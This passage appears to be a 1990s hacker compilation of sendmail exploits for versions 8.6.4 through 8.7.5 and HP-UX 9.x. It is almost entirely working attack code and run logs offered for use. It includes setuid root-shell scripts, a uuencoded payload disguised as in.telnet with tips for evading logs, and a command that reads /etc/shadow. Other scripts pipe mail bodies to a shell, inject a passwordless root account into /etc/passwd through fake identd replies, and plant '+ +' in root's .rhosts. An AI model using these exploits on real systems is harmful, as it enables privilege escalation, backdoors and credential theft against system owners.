/bin/sh /tmp/newsh\nchmod 666 /tmp/newsh\n\n$sendmail -d${n1}.116,${n2}.109,${n3}.112 `whoami`  <<EOF\n\ntest\nEOF\n\nif [ -x /tmp/newsh ]; then\n        echo \"Had the right offset for sendmail.cf.  Here's the result:\"\nelse\n        echo \"Looks like I had the wrong sendmail.cf offset.  Fuckers.\"\n        if [ ${n4}x = x ]; then\n                echo \"This version isn't what I thought it was.\"\n                echo \"Look for other suid sendmails and try this on them.\"\n        else\n                echo \"I'm taking another stab with a different offset.\"\n$sendmail -d${n4}.116,${n5}.109,${n6}.112 `whoami` <<EOF\n\ntest\nEOF\n                echo \"Here's the result:\"\n        fi\nfi\n\nrm /tmp/in.telnet\nrm -r /tmp/mail\nrm /tmp/sendmail.cf\nls -l /tmp/newsh\n\nexit\n\n# I'm calling this in.telnet for one reason.  It shows up in the acct logs\n# as being run by root.  It will attract less attention if it's something\n# normally run by root.  An alert admin will catch is anyway, because\n# in.telnet is normally not associated with a tty.  The obvious fix, if you\n# want to go undetected, would be to modify the acct files once you've\n# become root.\nbegin 775 /tmp/in.telnet.Z\nM'YV0@08$6    (B\"!A$J5 CBX,*\"O\" <A#8 %!!)%8E44@%\" \"4!H A\\!*+@atreus\nM0D$(U$2  S:@( )A ,0@  0)0  !@  0\"( 02$$%/ OZ1+\"S9T%'G$:  C%4atreus\nMH%&B00%T&O<+S0N7KBJ(0Q'!)20)(ACX!+!$DD0 K\"  0( 1%)>Q2RA)! %(atreus\nM5$,).9]$%38!E!= H,(LP$LV*KJ*8(15)\".N(AI2!6Q*(@ HPM6U6<4A@716atreus\nM+H@\"%QQ:D@!. \":U%L;2T'36E%H$D 0 H\"!ML><#H0N.!B?A-(#4!5>PGGT9atreus\nM068Z7==^%;%A[ BS!U6]5@P*#4V;. $L*)YY,P%@$LP\"B' [-X#=O=56&'N!atreus\nM]4'J<$(\"\"V!.*1]U2@&Q4TJHY5J8,@FC%\"+^00 3&, (\" HC_B$@\" 1@D*$@atreus\nM))R!$, GQ!0$'1^!' ,. H&@<U).!CSX&00Y$6#B$2@\"((\") T0\"S4$*I!A5atreus\nM(,-\\&%6% DA2 #@$4%, , \"82(\",!U7XAXD!(&G4\"W7,(<<+;*0A!I5DN##'atreus\nM&P\"\\0$89=KR@1QER</E0!F/(00<,.H#@QAL@0\"DEE59BJ>4;\"CP$@ EIKMFFatreus\nMG%-6>24;66X)0AMAP %'&FZ< 8(98:3!1AURE)'G0A3TR::;<'H)IIADXKG0atreus\nM\"W2T <<+;I1QQQQH%#35+Y\",%40(+OET@!X5 @ )!2)  AT MN;AF:Z\\Q@K atreus\nM 7F8E4([MJZ1:X<?AOC0JY DAY( ((!3UR__$-: )!)D\"XT 8%!FEXLY)3\"Latreus\nM)>02\\*LD[8X+Q )U'20!M_U\\!$H DDB24W8*6\"M*N.\"$H@(8 D!#P'B?P&03atreus\nM0J 0\\@,_,N\"K\\'C0@BBB5%15>Y(TV')3%QCH I  *.%R<S$ #1<4$@@$K%POatreus\nM /?^LT]4R<$&%CBV(O%KQM)R#.L$)XT+!C,S$T9 A0'\\\\<\\_YT CPM% ;_P0atreus\nM$&P41( E3_^3(;!X%)0 UT_3(A0A!15 ]C^L\"%43  VLO3$0G!2TP-K8\"(7*atreus\nM3VLS(Y39 #BP-A,(^0>  0BI51#1!36 $ 4(1>7X0Y$5)%M!!R\"TL$L(50[ atreus\nMI8<CE !\"F1?D $((($20V @Q@!#HBFN'T .M(Y1<X'K2_M#M$B#4^T.,8ZHGatreus\nM )$=P$A!)R!!>N8&A\"-4WJ:/7H#?P%H]060%G&Z00P!DP-, 8NA9 D\\&B*,Gatreus\nM\"Y$-X$=!(M1=D R9%R\"'4$06M$/F!^0@E$)%? ^*GDO@R0% IQ I\") %>LI\"atreus\nM9 A@BH*,@!0(\"0-/B**G-)\"/#GJ20^9,(Q1H((00HSM ')Z'D$F,3@#3$ HXatreus\nM$\"**R!@@#P[$ D)JX<)$L&^%!4%&_/X'+&1\\H0QT* ,>,/A#,H2!#F$ P _=atreus\nM0 8 S &):G(B%.GP!3.PX0U'5.(/\\9 &(B**44HL@QOLD(8RN4&+1,B\"$X+0atreus\nMA\"0,(8Q<).(8T-\"&-S3Q\"W-\\PQW.^(4^?I&/<P!B'=)PQS>X88M=U*(0N_@%atreus\nM,M2A#6W(0R/+,(:L]?$+0Z#\"$Z3P!28D80I4Z*,6OT $37+2DZ 4Y27)\\(8Oatreus\nMG.&*8@@#&_!(AS?(80ZC9*4K82G+1M;REHJ,8R,?&<DO5,H,PWM!&<I ACG8atreus\nM84ID2,,<UC #*KUA#+*DTY7.,(8QM$!0+Y@#',(@!V_.H0YN:,$YWS0'&K@@atreus\nM!BZHI@Q<4(-XZD\"9S'0F-*5)36MBDPW:'-X!Z**0\"6).<0<004XB]Y Q ( ,atreus\nM61N>1\"=*T8I:]*(8S:A&-\\K1CGKTHR -J4A'2M*2FO2D*$VI2E?*TI:Z]*4Patreus\nMC:E,9TK3FMKTICC-J4YWRM.>^O2G0 VJ4(=*U*(:]:A(3:I2E\\K4ICKUJ5\"-atreus\nMJE2G2M6J6O6J6,VJ5K?*U:YZ]:M@#:M8QTK6LIKUK&A-JUK7RM:VNO6M<(VKatreus\nM7.=*U[K:]:YXS>M2_0,$UP&+!\"<MW>'V!BPN\"(5D !B !W4\"6)U0;R&5*P Ratreus\nM$()#[@$ L3XQ7\"\" 0;*HO H43OL'/SQ+%= ^+1]!\"<!G0VN/H A@M4^;1U &atreus\nM -M_P\",H!*AM.X)2@-JJ(RB(DR@0%JO7XAKWN,A-KG*7R]SF.O>YT(VN=*=+atreus\nMW>I:][K8S:YVM\\O=[GKWN^ -KWC'2][RFO>\\Z$VO>M?+WO:Z][WPC:]\\YTO?atreus\n+^MKWOOC-KW[WFUS=atreus\n atreus\nendatreus\n----------------------- CuT HeRe -------------------------------------\n\nHere it is the other script:\n\n       \n/* What follows is a sample run exercising the latest sendmail hole and the\nscript used to exploit this hole.  This is a re-send; I neglected\nto escape the \".\" in the sendmail script, leaving the program\nslightly truncated.  To fix this, I have escaped the . so prior\nto executing this you must remove the \\.  (does that make any sense? :-)\nThere was also a small problem with nested quotes pointed out by Peter\nWemm which I have fixed.\n\nThis is the \"small version\" of the script; it assumes you have a sane\nsendmail.cf.  In this manner, it is not a particularly robust \"breakin\nscript\" but I believe it does illustrate how to exploit the bug.\n\nThis program uses \"calc.c,\" the program mentioned by Timothy Newsham in\nan earlier message.  The program has been modified slightly so that it\ngives better results (it would occasionally fail to locate the offset of\na config given a buggy sendmail.  The fix is to force a sync() after\nit generates a coredump.)  The remainder of the program was written\nby myself and a fellow student, Steven Dake.\n\nWe have held off on releasing this script until we were able to notify\nthe people responsible for system security at NAU.  Locals subscribing\nto this digest beware; sendmail on our machines has been patched! :-) */\n\nScript started on Thu Mar 24 00:54:54 1994\n[pine] [1] date\nThu Mar 24 00:54:57 MST 1994\n[pine] [2] whoami\njwa\n[pine] [3] id\nuid=4473(jwa) gid=400(student)\n[pine] [4] ls -l sendbug.sh\n-rwx------   1 jwa      student     4893 Mar 24 00:46 sendbug.sh*\n[pine] [5] sendbug.sh\nCreating setid0 ...\nCreating calc...\nScanning core image for /nau/local/lib/mail/sendmail.cf...\nCreating alias.sh ...\nCreating fake alias file...\nFaking alias pointer in new config file...\nCreating the sendmail script...\nExecuting /usr/lib/sendmail -\nd4294935548.47,4294935549.116,4294935550.109,4294935551.112,4294935552.47,4294935553.115,429\n4935554.109,4294935555.46,4294935556.9\nVersion 8.6.4\n220-pine.cse.nau.edu Sendmail 8.6.4/WHOOP-v1.0 ready at Thu, 24 Mar 1994 \n00:55:21 -0700\n220 ESMTP spoken here\n250 pine.cse.nau.edu Hello jwa@localhost, pleased to meet you\n250 <nobody>... Sender ok\n250 <yash>... Recipient ok\n354 Enter mail, end with \".\" on a line by itself\n250 AAA01803 Message accepted for delivery\n503 Need MAIL before RCPT\n503 Need MAIL command\n500 Command unrecognized\n500 Command unrecognized\n221 pine.cse.nau.edu closing connection\nsetid0 is a suid shell.  executing...\nexecuting /bin/csh...\npine# whoami\nroot\npine# id\nuid=0(root) gid=0(root)\npine# exit\npine# end of script.\n\n. and here's the program.\n\n#!/bin/sh\n# exploit new sendmail bug to give us a root shell\n# 24 mar 94  jwa/scd @nau.edu\n# \"short version\"\n# tested on sunos 5.2/sendmail 8.6.4\n\n# location of sendmail\nSENDMAIL=/usr/lib/sendmail\n\n# location of original sendmail.cf file\nCONFIG=/nau/local/lib/mail/sendmail.cf\n#CONFIG=`strings $SENDMAIL | grep sendmail.cf`\n\n# program to execute as root\nSHELL=/bin/csh\n\nTEMPDIR=/tmp/sendbug-tmp.$$\nmkdir $TEMPDIR\nchmod 700 $TEMPDIR\ncd $TEMPDIR\n\ncp $SENDMAIL sm\nchmod 700 sm\n\necho \"Creating setid0 ...\"\ncat > setid.c << _EOF_\n\n/* set uid to zero, thus escaping the annoying csh and solaris sh\n * problem..\n *\n * if (getuid() != geteuid()) {\n *  printf(\"permission denied, you root-hacker you.\\n\");\n *  exit(1);\n * }\n *\n * .. must be run euid 0, obviously.  with no args it runs /bin/sh,\n * otherwise it runs the 1st arg.\n */\n\n#include <stdio.h>\n\nmain(argc, argv)\nint argc;\nchar *argv[];\n\n int uid;\n\n setuid(0);\n setgid(0);\n seteuid(0);  /* probabally redundant. */\n setegid(0);\n\n uid = getuid();\n\n if (uid != 0) {\n  printf(\"setuid(0); failed!  aborting..\\n\");\n  exit(1);\n }\n\n if (argc !=2) {\n  printf(\"executing /bin/sh...\\n\");\n  system(\"/bin/sh\");\n }\n  else\n {\n  printf(\"executing %s...\\n\", argv[1]);\n  system(argv[1]);\n }\n\n_EOF_\n\ncc -o setid0 setid.c\n\necho \"Creating calc...\"\n\ncat > calc.c << _EOF_\n/*\n * Determines offset in sendmail of\n * sendmail.cf file location.\n * author: timothy newsham\n */\n#include <fcntl.h>\n\ngencore()\n\n  int pid;\n  int fd[2];\n\n  if(pipe(fd) < 0) {\n    perror(\"pipe\");\n    exit(1);\n    return(0);\n  }\n  pid = fork();\n  if(!pid) {\n    int f = open(\"./out\", O_RDWR|O_CREAT, 0666);\n    dup2(f, 1); dup2(fd[0], 0);\n    close(f); close(fd[1]); close(fd[0]);\n    execl(\"./sm\",\"sm\",\"-d0-9.90\",\"-oQ.\",\"-bs\", 0);\n    perror(\"exec\");\n    exit(0);\n  } else {\n    sleep(2);\n    kill(pid, 11);\n  }\n  close(fd[0]);\n  close(fd[1]);\n\n\nmain(argc,argv)\nchar **argv;\nint argc;\n\n  unsigned int ConfFile,tTdvect,off;\n\n  gencore();\n  sync();   /* grr. */\n  tTdvect = find(\"ZZZZZZZZ\", \"core\");\n  ConfFile = find(argv[1], \"core\");\n  if(!tTdvect || !ConfFile) {\n   return(1);\n  }\n  off = ConfFile - tTdvect;\n\n  \nprintf(\"-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\\n\",  off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \\\n  off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10);\n\nint find(pattern, file)\nchar *pattern,*file;\n\n  int fd;\n  int i, addr;\n  char c;\n\n  fd = open(file, 0);\n\n  i = 0;\n  addr = 0;\n  while(read(fd, &c, 1) == 1) {\n    if(pattern[i] == c)\n      i++;\n    else\n      i=0;\n    if(pattern[i] == '\\0') {\n      addr -= strlen(pattern);\n      return(addr);\n    }\n    addr++;\n  }\n  return(0);\n\n_EOF_\ncc calc.c -o calc\n\necho \"Scanning core image for $CONFIG...\"\n\nDEBUGFLAGS=`calc $CONFIG`\n\necho \"Creating alias.sh ...\"\necho \"#!/bin/sh\n# this program will be executed when mail is sent to the fake alias.\n# since solaris sh and csh and tcsh refuse to run when euid != realuid,\n# we instead run the program we compiled above.\n\n/bin/chmod 6777 $TEMPDIR/setid0\n/bin/chown root $TEMPDIR/setid0\n/bin/sync\n\n\" > alias.sh\n\nchmod 755 alias.sh\n\necho \"Creating fake alias file...\"\necho \"yash: |$TEMPDIR/alias.sh\" > aliases\n\necho \"Faking alias pointer in new config file...\"\negrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf\necho \"\n# hacks follow\n\nOA/$TEMPDIR/aliases                     # our fake alias file\nOu0                                     # user ID to run as\nOg0                                     # group ID to run as\nDZWHOOP-v1.0\" >> /tmp/sm.cf\n\necho \"Creating the sendmail script...\"\n\ncat > sendmail.script << _EOF_\nhelo\nmail from: <nobody>\nrcpt to: <yash>\ndata\nyet another sendmail hole?  suid whoop?\n\\.                                      # oops.. delete \\ prior to execution\nquit\n_EOF_\n\necho \"Executing $SENDMAIL $DEBUGFLAGS -bs...\"\n\n$SENDMAIL $DEBUGFLAGS -bs < sendmail.script\n\n# give it time to execute.\nsleep 4\n\n# cleanup in 5 seconds\n(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &\n\nif [ -u setid0 ]\nthen\n echo \"setid0 is a suid shell.  executing...\"\n cd /\n $TEMPDIR/setid0 /bin/csh\n echo \"end of script.\"\n exit 0\nelse\n echo \"setid0 is not suid; script failed.\"\n echo \"apparently, you don't have the bug.  celebrate :-)\"\n exit 1\nfi\n\n--------------------------------- CuT HeRe --------------------------------\n\n\n= -oE/filename bounce =               *8.6.7* \n\nVersion affected: 8.6.7\n\nA bug in Sendmail 8.6.7 allows anyone to read any file,\nincluding the shadowed password file:\n\n/usr/lib/sendmail -oE/etc/shadow bounce\nFrom: your_username\n\n\n\n= 8.6.9 =                      *8.6.9 or earlier* \n\nMail any file to yourself.  \n\n------8<-------------------Cut Here--------------------8<-------------------\n# This is a shell archive.  Save it in a file, remove anything before\n# this line, and then unpack it by entering \"sh file\".  Note, it may\n# create directories; files and directories will be owned by you and\n# have default permissions.\n#\n# This archive contains:\n#\n#       description\n#       sm869.local\n#       sm869.remote\n#\necho x - description\nsed 's/^X//' >description << 'END-of-description'\nX\nXProgram: sm869.remote\nX\nXyou can:\nX\nX   run the body of the mail through a shell if\nX   sendmail is allowed to run a shell.\nX\nX   write the whole message to a file.\nX\nX   have it send back a file to an account you specify.\nX\nXThe last option is supposed to remove the file after sending\nXit but I found that it hasn't in my tests.  Why?  Well\nXit has multiple recipients, one of the recipients is a\nXrecipient that will never go through.  So the data file\nXgets kept around until it gives up on that host.  This\nXcan be several days.\nX\nXProblems:\nX\nX  The action you specify will happen every 30minutes (the\nX  queue time, may be different) until it gives up sending\nX  to the unreachable host.  (Actually this may be false.\nX  I haven't left it around long enough to see if this happens.\nX  Perhaps sendmail is smart enough to remove the other recipients\nX  that did get delievered from the queue file).\nX\nX  If you send a file back to yourself it may get removed\nX  several days later.  If you get the password file or\nX  some other critical file you had better be ready to clean\nX  up.\nX\nX  Lots of logs.  Its fairly obvious from the log files that\nX  some hokey pokey is going on.  If you're sending a file\nX  back to yourself then you're pointing a finger at one\nX  of your accounts\nX\nXYou have to go into the program to change the options you\nXwant.  The code is fairly well commented so this shouldn't\nXbe any problem.\nX\nXProgram: sm869.local\nX\nXSame thing as above really except it works even if sendmail\nXdoesnt check identd and you dont have to specify an unreachable\nXhost.  The file goes straight to the queue.\nX\nEND-of-description\necho x - sm869.local\nsed 's/^X//' >sm869.local << 'END-of-sm869.local'\nX#!/bin/sh\nX#\nX# Exploit hole in sendmail 8.6.9 and earlier.\nX#\nX\nX# Either write a file or run a program.\nX#ACTION=\"|/tmp/runme\"\nXACTION=\"/tmp/writeme\"\nX\nX# Data file to read from and then remove\nXDATAFILE=\"/tmp/abc\"\nX#DATAFILE=\"\"\nX\nX# Who to run as\nXRUNAS=\"bin\"\nX\nX# Who to send mail to\nXWHOAMI=`whoami`\nXSENDTO=$WHOAMI\nX#SENDTO=\"someone-else\"\nX\nX# Build up arg and send it off\nXif [ -n \"$DATAFILE\" ] ; then\nXARG=\"$WHOAMI\nXD$DATAFILE\nXC:$RUNAS\nXR\\\"$ACTION\\\"\"\nXelse\nXARG=\"$WHOAMI\nXC:$RUNAS\nXR\\\"$ACTION\\\"\"\nXfi\nXsendmail -odq -F\"$ARG\" $SENDTO << _END_\nXThis is appearing in the mailbox\nXand also being piped to the program or\nXwritten to the file, UNLESS you specify\nXa datafile above.  In that case the datafile\nXwill be written and erased and this text will\nXbe left (not deleted) in the queue directory.\nX_END_\nX\nEND-of-sm869.local\necho x - sm869.remote\nsed 's/^X//' >sm869.remote << 'END-of-sm869.remote'\nX#!/bin/sh\nX#\nX# exploit for sm869 or worse\nX# identd must not be enabled (port 113 must be free)\nX\nX# this must be a host that mail can go to (MX not pointing elsewhere)\nX# that we cant reach right now (ie. host doesnt exist anymore)\nXUNREACHABLE=\"goofy.uhcc.hawaii.edu\"\nX\nX# Commands to run on remote host\nXCOMMANDS=\"touch /tmp/gotcha\"\nX\nX# what host to run it on\nXTARGET=\"localhost\"\nX\nX# work in a temp dir\nXTD=/tmp/.Xwork.$$\nXmkdir $TD\nXcd $TD\nX\nXcat > a.c <<_END_\nX#include <sys/types.h>\nX#include <sys/socket.h>\nX#include <netinet/in.h>\nX\nX/* run body of mail through shell run as daemon */\nX#define REPLY \"USERID : UNIX : a\\nC:daemon\\nR\\\"|sed \n'1,/^$/d'|/bin/sh\\\"\\nHXxx:\n\"\nX\nX#ifdef other_possibilities\nX/* write to a file as daemon */\nX#define REPLY \"USERID : UNIX : a\\nC:daemon\\nR/tmp/writeme\\nHXxx: \"\nX/* send back a file to someone and erase it */\nX#define REPLY \"USERID : UNIX : \na\\nD/tmp/sendtome\\nRmy@address.here\\nHXxx: \"\nX#endif\nX\nXreadline(fd, buf, len)\nXchar *buf;\nX{\nX    int i = 0;\nX\nX    while(i < len && read(fd, &buf[i], 1) == 1 && buf[i]) {\nX       if(buf[i] == '\\r' || buf[i] == '\\n')\nX           break;\nX       i++;\nX    }\nX    buf[i] = '\\0';\nX}\nX\nXdie(str)\nXchar *str;\nX{\nX    perror(str); exit(1);\nX}\nX\nXmain()\nX{\nX    int s, s2, adlen;\nX    struct sockaddr_in ad;\nX    char buf[60];\nX\nX    ad.sin_family = AF_INET;\nX    ad.sin_port = htons(113);\nX    ad.sin_addr.s_addr = INADDR_ANY;\nX    if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) die(\"socket\");\nX    if(bind(s, (struct sockaddr *)&ad, sizeof(ad)) == -1) die(\"bind\");\nX    if(listen(s, 1) == -1) die(\"listen\");\nX    adlen = sizeof(ad);\nX    s2 = accept(s, (struct sockaddr *)&ad, &adlen);\nX    if(s2 == -1) die(\"accept\");\nX    printf(\"Connection from %s port %d\\n\",\nX        inet_ntoa(ad.sin_addr), ntohs(ad.sin_port));\nX    readline(s2, buf, 50);\nX    sprintf(buf + strlen(buf), \" : %s\\n\", REPLY);\nX    write(s2, buf, strlen(buf));\nX}\nX_END_\nX\nX# compile program\nXecho \"compiling\"\nXcc a.c -o ident\nXecho \"running fake ident\"\nX./ident &\nX\nX# send to reomte\nXecho \"talking to remote\"\nX(\nX  sleep 1; echo \"helo\"\nX  sleep 1; echo \"mail from: <dan>\"\nX  sleep 1; echo \"rcpt to: <bounce@$UNREACHABLE>\"\nX  sleep 1; echo \"data\"\nX  echo \"$COMMANDS\"\nX  echo \".\"\nX  sleep 1; echo \"quit\"\nX  sleep 5\nX) | telnet $TARGET 25\nX\nX# cleanup\nXcd /\nXrm -rf $TD\nXecho \"done.\"\nX\nEND-of-sm869.remote\nexit\n\n.................................. CuT HeRe ..................................\n\n\n= 8.6.9 newlines =               *8.6.9*\n\nWhen a message is queued for delivery by sendmail, a pair of files are\nwritten to the spool directory (/var/spool/mqueue on many systems).\nOne of these files (qf<something>) contains information related to the\nprocessing of the message (headers, sender, recipient, etc.).  Taking\nversions of sendmail prior to 8.6.10 as an example, one of the pieces\nof information maintained in this file is the name of the controlling\nuser if mail is being delivered to a script (or file).  By feeding\nsendmail a recipient address that contains newlines, it is possible to\nadd lines to the queue file which specify a controlling user and an\nexecutable to run with that users access level.  The 8.6.10 patch\nremoves this hole, by stripping newlines from the recipient address\nbefore writing the queue file.\n\n\nEXPLOIT:\n\n/* smh.c - Michael R. Widner - atreus (2/27/95)\n * <widner@uchicago.edu> <atreus@primus.com>\n * a quick hack to abuse sendmail 8.6.9 or whatever else is subject to this\n * hole.  It's really just a matter of passing newlines in arguments to\n * sendmail and getting the stuff into the queue files.  If we run this\n * locally with -odq we are guaranteed that it will be queue, rather than\n * processed immediately.  Wait for the queue to get processed automatically\n * or just run sendmail -q if you're impatient.\n\n * usage: smh [ username [/path/to/sendmail]]\n\n * It's worth noting that this is generally only good for getting bin.\n * sendmail still wants to process the sendmail.cf file, which contains\n * Ou1 and Og1 most of the time, limiting you to bin access.  Is there\n * a way around this?\n\n * cc -o smh smh.c should do the trick.  This just creates a bin owned\n * mode 6777 copy of /bin/sh in /tmp called /tmp/newsh.  Note that on some\n * systems this is pretty much worthless, but you're smart enough to know\n * which systems those are.  Aren't you?\n */\n\n#include <sys/types.h>\n#include <unistd.h>\n#include <stdlib.h>\n\nmain(argc, argv)\nint argc;\nchar **argv;\n{\n        execlp(argv[2] ? argv[2] : \"sendmail\",\"sendmail\",\"-odq\",\"-p\",\n        \"ascii\\nCroot\\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\\nMlocal, \nP=/bin/sh, F=lsDFMeu,\nA=sh -c $u\\nR<\\\"|/bin/cp /bin/sh /tmp/newsh\\\">\\nR<\\\"|/bin/chmod 6777 \n/tmp/newsh\\\">\\n$rascii \",\n        argv[1] ? argv[1] : \"atreus\",0);\n}\n\n\n................................ CuT HeRe ..................................\n\n\n= 8.6.10 ident/newlines =      *8.6.10*\n\nThis is a sendmail 8.6.10 attack based on the problems that sendmail \n8.6.10 inherited from sendmail 8.6.9 .... Look at comments in the source.\nTwo exploits follow:\n\n\n/* 8.6.10 sendmail attacker\n *\n * gcc ident.c -o ident\n * add the following line to your /etc/inetd.conf:\n * ident  stream tcp  nowait  root  /tmp/ident  in.identd\n * then kill -HUP inetd\n *\n * Not for not public use or disclosure.\n *\n * This is a sendmail 8.6.10 attack based on the problems that\n * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting\n * information given to it by identd, which included bogus characters\n * and newlines that it later appended to the queue file.  Sendmail 8.6.10\n * supposedly \"strips\" newlines before they are written, however, it\n * converts them to spaces, and the following code demonstrates that\n * quick work-around patches are never ever stable...\n *\n * NOTES:  This hack only works when sendmail queues up the message for\n * later delivery.  This depends on the configuration of sendmail.cf and\n * on the machine loading.  If you can do something to drag the machine to\n * its knees, then fire off this attack, you stand a much better chance of\n * success.\n *\n * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the\n * default user to bin.bin), this exploit will not work.\n *\n * Also, since this only works when sendmail queues up the message for\n * later delivery, the time of execution is dependant on how sendmail\n * has been configured in sendmail.cf and machine load.  Heavily loaded\n * machines (or machines that have been intentionally flooded) have a\n * greater possibility of this exploit working.\n *\n */\n\n#include <sys/types.h>\n#include <sys/fcntl.h>\n#include <sys/time.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n/* TIMEOUT is the number of seconds to wait before closing the connection if\n * the client doesn't provide the port pairs.\n */\n\n#define TIMEOUT 120\n/* PROCINFO_BUFFER_SIZE must be bigger than 80 */\n#define OUTPUT_BUFFER_SIZE 2048\n#define SOCKET_BUFFER_SIZE 100\n\nunsigned short lport = 0, rport = 0;\n\nvoid\nmain ()\n{\n    unsigned long here, there;\n    struct fd_set fdset;\n    struct timeval timeout;\n    char buffer[OUTPUT_BUFFER_SIZE];\n    char inbuffer[SOCKET_BUFFER_SIZE];\n    int len;\n    int fd;\n\n    FD_ZERO (&fdset);\n    FD_SET (0, &fdset);\n    timeout.tv_sec = TIMEOUT;\n    timeout.tv_usec = 0;\n\n    select (1, &fdset, NULL, NULL, &timeout);\n    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );\n    if (len <= 0)\n    exit (0);\n    FD_SET (0, &fdset);\n\n    sprintf (buffer, \"%s : USERID : UNIX : %s\\r\\n\", inbuffer,\n    \"Croot\\r\\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\\r\\nMlocal,\n    P=/bin/sh, F=lsDFMeu, A=sh -c $u\\r\\nR<\\\"|/bin/echo toor::0:1:toor:/:/bin/csh\n >> /etc/passwd\\\">\\r\\nR<\\\"|/usr/bin/chmod 4755 /usr/bin/time\\\");\n    write (1, buffer, strlen (buffer));\n    exit (0);\n}\n\n................................ CuT HeRe ..................................\nSecond Exploit follows:\n\n/* 8.6.10 sendmail attacker\n *\n * gcc ident.c -o ident\n * add the following line to your /etc/inetd.conf:\n * ident  stream tcp  nowait  root  /tmp/ident  in.identd\n * then kill -HUP inetd\n *\n * Not for not public use or disclosure.\n *\n * This is a sendmail 8.6.10 attack based on the problems that\n * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting\n * information given to it by identd, which included bogus characters\n * and newlines that it later appended to the queue file.  Sendmail 8.6.10\n * supposedly \"strips\" newlines before they are written, however, it\n * converts them to spaces, and the following code demonstrates that\n * quick work-around patches are never ever stable...\n *\n * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the\n * default user to bin.bin), this exploit will not work.\n *\n * Also, since this only works when sendmail queues up the message for\n * lar delivery, the time of execution is dependant on how sendmail\n * has been configured in sendmail.cf and machine load.  Heavily loaded\n * machines (or machines that have been intentionally flooded) have a\n * greater possibility of this exploit working.\n *\n */\n\n#include <sys/types.h>\n#include <sys/fcntl.h>\n#include <sys/time.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n/* TIMEOUT is the number of seconds to wait before closing the connection if\n * the client doesn't provide the port pairs.\n */\n\n#define TIMEOUT 120\n/* PROCINFO_BUFFER_SIZE must be bigger than 80 */\n#define OUTPUT_BUFFER_SIZE 2048\n#define SOCKET_BUFFER_SIZE 100\n\nunsigned short lport = 0, rport = 0;\n\nvoid\nmain ()\n{\n    unsigned long here, there;\n    struct fd_set fdset;\n    struct timeval timeout;\n    char buffer[OUTPUT_BUFFER_SIZE];\n    char inbuffer[SOCKET_BUFFER_SIZE];\n    int len;\n    int fd;\n    FD_ZERO (&fdset);\n    FD_SET (0, &fdset);\n    timeout.tv_sec = TIMEOUT;\n    timeout.tv_usec = 0;\n\n    select (1, &fdset, NULL, NULL, &timeout);\n    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );\n    if (len <= 0)\n    exit (0);\n    FD_SET (0, &fdset);\n    sprintf (buffer, \"%s : USERID : UNIX : %s\\r\\n\", inbuffer,\n    \"Croot\\t\\t\\t\\t\\t\\t\\tMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\\t\\t\\t\\t\\t\\t\n    Mlocal,\n    P=/bin/sh, F=lsDFMeu, A=sh -c $u\\t\\t\\t\\t\\t\\tR<\\\"|/bin/echo toor::0:1:toor:/:\n/bin/csh >> /etc/passwd\\\">\\t\\t\\tR<\\\"|/usr/bin/chmod 4755 /usr/bin/time\\\">\\r\\n\n    $rascii done\");\n    write (1, buffer, strlen (buffer));\n    exit (0);\n}\n        \n................................ CuT HeRe ..................................\n\n\n\n= HP-UX =                  *HP-UX 9.x*     \n\n\n#!/bin/sh\n# This works on virgin HPUX 9.x sendmail.cf\n# The link can be set to any file on the system, it will append the contents\n# of the email to the linked file (/etc/passwd, /etc/hosts.equiv, /.rhosts)..\n# - sirsyko\n\nr00tDIR=`grep root /etc/passwd |cut -f6 -d:`\nRunDMC=`hostname`\n\nif [ -f /tmp/dead.letter ]; then rm /tmp/dead.letter\nfi\nif [ -f /tmp/dead.letter ]; then\n echo \"Sorry, aint gonna work\"\n exit\nfi\n\nln -s  ${r00tDIR}/.rhosts /tmp/dead.letter\n\n(\nsleep 1\necho \"helo\"\necho \"mail from: noone\"\necho \"rcpt to: noone@bounce\"\necho \"data\"\necho \"+ +\"\necho \".\"\nsleep 3\necho \"quit\"\n) | telnet ${RunDMC} 25\n\nsleep 5\nremsh ${RunDMC} -l root\n\n............... CuT HeRe ...............\n\nWhat the r00t guys exploit does is just this: \n- creates a symbolic link to the target file\n  (in this case '.rhosts' in root's directory) called '/tmp/dead.letter'.\n- Then sends a message (containing lines you want to append) to a \n  non-existent user.\n- Sendmail is configured (as default) to append lines of non-recipient\n  messages to '/tmp/dead.letter' and does it with root privileges.\n  If '/tmp/dead.letter' is a symbolic link Sendmail will follow it\n  and will overwrite the pre-existent file.\n- Probably if Sendmail configuration has been changed to make it behave \n  in a different way, looking at the cf file could lead you to exploit \n  the bug the same. \n\n\n= 8.7.5 gecos =                *8.X.X <8.8.0* *TeSTed oN 8.6.12*\n\nThis bug was pointed out by Mudge of L0pht on Bugtraq on Sept 1996,\nexcerpts follow:\n\n------ \nA buffer overflow condition exists that allows a user to overwrite the \ninformation in a saved stack frame. When the function returns, the saved \nframe is popped off of the stack and user code can be executed.\nIf a user is able to alter his/her gecos field then that user can\nexploit a coding flaw in sendmail to elevate their effective UID to 0.\n \nThe actual problem in the code is quite apparent.\n\n  Inside recipient.c we find the following:\n\n  char nbuf[MAXNAME + 1];\n  ...\n  buildfname(pw->pw_gecos, pw->pw_name, nbuf);\n\nThe problem is that nbuf[MAXNAME + 1] is a fixed length buffer and as\nwe will soon see, buildfname() does not honor this.\n[ ..... ]\n\nThis particular problem has been fixed in Sendmail 8.8 beta.\n_______\n\nHere we have an example of exploit:\n------------------------------ Cut Here ------------------------------------\n\n/*                               Hi !                                       */\n/* This is exploit for sendmail bug (version 8.6.12 for FreeBSD 2.1.0).     